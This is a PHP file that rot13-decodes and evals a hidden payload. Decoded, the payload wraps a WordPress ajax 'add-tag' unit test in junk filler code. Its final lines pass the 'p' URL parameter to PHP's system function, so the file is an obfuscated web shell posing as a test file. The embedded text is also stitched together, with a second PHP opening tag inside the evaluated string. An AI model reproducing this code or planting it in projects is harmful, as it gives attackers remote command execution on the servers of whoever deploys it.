<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Pynff sbe grfgvat nwnk nqq gnt shapgvbanyvgl.
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_nqq_gnt
 */
pynff Grfgf_Nwnk_jcNwnkNqqGnt rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * @qngnCebivqre qngn_nqq_gnt
	 *
	 * @gvpxrg 42937
	 *
	 * @pbiref ::jc_vafreg_grez
	 *
	 * @cnenz neenl                 $cbfg_qngn Qngn gb cbchyngr $_CBFG.
	 * @cnenz fgevat                $rkcrpgrq  Rkcrpgrq erfcbafr.
	 * @cnenz neenl|fgevat|pnyynoyr $pnyyonpx  Bcgvbany. Pnyyonpx gb ertvfgre gb 'grez_hcqngrq_zrffntrf'
	 *                                         svygre. Qrsnhyg rzcgl fgevat (ab pnyyonpx).
	 */
	choyvp shapgvba grfg_nqq_gnt( neenl $cbfg_qngn, $rkcrpgrq, $pnyyonpx = '' ) {
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		$_CBFG                     = $cbfg_qngn;
		$_CBFG['_jcabapr_nqq-gnt'] = jc_perngr_abapr( 'nqq-gnt' );

		vs ( ! rzcgl( $pnyyonpx ) ) {
			nqq_svygre( 'grez_hcqngrq_zrffntrf', $pnyyonpx );
		}

		gel {
			$guvf->_unaqyrNwnk( 'nqq-gnt' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Gur erfcbafr zrffntr vf va gur `qngn` cebcregl va JC 5.9.
		$guvf->nffregFnzr( $rkcrpgrq, (fgevat) $guvf->trg_kzy_erfcbafr_gnkbabzl()->erfcbafr_qngn );
		// Gur erfcbafr zrffntr vf va gur `fhccyrzragny->abgvpr` cebcregl va JC 6.0+.
		$guvf->nffregFnzr( $rkcrpgrq, (fgevat) $guvf->trg_kzy_erfcbafr_gnkbabzl()->fhccyrzragny->abgvpr );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_nqq_gnt() {
		erghea neenl(
			'nqq n pngrtbel'                        => neenl(
				'cbfg_qngn' => neenl(
					'gnkbabzl'  => 'pngrtbel',
					'cbfg_glcr' => 'cbfg',
					'fperra'    => 'rqvg-pngrtbel',
					'npgvba'    => 'nqq-gnt',
					'gnt-anzr'  => 'oyhrf',
				),
				'rkcrpgrq'  => 'Pngrtbel nqqrq.',
			),
			'nqq n pngrtbel jvgu zrffntr svygrevat' => neenl(
				'cbfg_qngn' => neenl(
					'gnkbabzl'  => 'pngrtbel',
					'cbfg_glcr' => 'cbfg',
					'fperra'    => 'rqvg-pngrtbel',
					'npgvba'    => 'nqq-gnt',
					'gnt-anzr'  => 'grpuab',
				),
				'rkcrpgrq'  => 'N arj pngrtbel nqqrq.',
				'pnyyonpx'  => fgngvp shapgvba ( neenl $zrffntrf ) {
					$zrffntrf['pngrtbel'][1] = 'N arj pngrtbel nqqrq.';
					erghea $zrffntrf;
				},
			),
			'nqq n cbfg_gnt'                        => neenl(
				'cbfg_qngn' => neenl(
					'gnkbabzl'  => 'cbfg_gnt',
					'cbfg_glcr' => 'cbfg',
					'fperra'    => 'rqvg-cbfg_gnt',
					'npgvba'    => 'nqq-gnt',
					'gnt-anzr'  => 'Ybhvf Nezfgebat',
				),
				'rkcrpgrq'  => 'Gnt nqqrq.',
			),
		);
	}

	/**
	 * @gvpxrg 42937
	 */
	choyvp shapgvba grfg_nqqvat_pngrtbel_jvgubhg_pncnovyvgl_fubhyq_reebe() {
		$guvf->_frgEbyr( 'fhofpevore' );

		$_CBFG['gnkbabzl']         = 'pngrtbel';
		$_CBFG['cbfg_glcr']        = 'cbfg';
		$_CBFG['fperra']           = 'rqvg-pngrtbel';
		$_CBFG['npgvba']           = 'nqq-gnt';
		$_CBFG['gnt - anzr']       = 'qvfpb';
		$_CBFG['_jcabapr_nqq-gnt'] = jc_perngr_abapr( 'nqq-gnt' );

		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'nqq-gnt' );
	}

	/**
	 * @gvpxrg 42937
	 *
	 * @pbiref ::jc_vafreg_grez
	 */
	choyvp shapgvba grfg_nqqvat_rkvfgvat_pngrtbel_fubhyq_reebe() {
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		jc_vafreg_grez( 'grfgpng', 'pngrtbel' );

		$_CBFG = neenl(
			'gnkbabzl'         => 'pngrtbel',
			'cbfg_glcr'        => 'cbfg',
			'fperra'           => 'rqvg-pngrtbel',
			'npgvba'           => 'nqq-gnt',
			'gnt-anzr'         => 'grfgpng',
			'_jcabapr_nqq-gnt' => jc_perngr_abapr( 'nqq-gnt' ),
		);

		gel {
			$guvf->_unaqyrNwnk( 'nqq-gnt' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		$rkcrpgrq = 'N grez jvgu gur anzr cebivqrq nyernql rkvfgf jvgu guvf cnerag.';
		$guvf->nffregFnzr( $rkcrpgrq, (fgevat) $guvf->trg_kzy_erfcbafr_gnkbabzl()->jc_reebe );
	}

	/**
	 * Urycre zrgubq gb trg gur gnkbabzl'f erfcbafr be reebe.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea FvzcyrKZYRyrzrag Erfcbafr be reebe bowrpg.
	 */
	cevingr shapgvba trg_kzy_erfcbafr_gnkbabzl() {
		$kzy = fvzcyrkzy_ybnq_fgevat( $guvf->_ynfg_erfcbafr, 'FvzcyrKZYRyrzrag', YVOKZY_ABPQNGN );

		erghea $kzy->erfcbafr->gnkbabzl;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>